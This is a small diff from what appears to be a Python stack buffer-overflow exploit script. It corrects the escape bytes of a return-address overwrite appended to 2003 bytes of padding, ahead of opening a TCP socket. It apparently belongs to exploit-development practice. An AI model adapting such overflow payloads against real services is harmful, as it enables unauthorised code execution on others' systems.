@@ -41,7 +41,7 @@ import sys, socket
 # 625011af
 
 # replace 2003 with the offset you got 
-shellcode = "A" * 2003 + "\xaf\x11\x50\62"
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
 
 try: 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
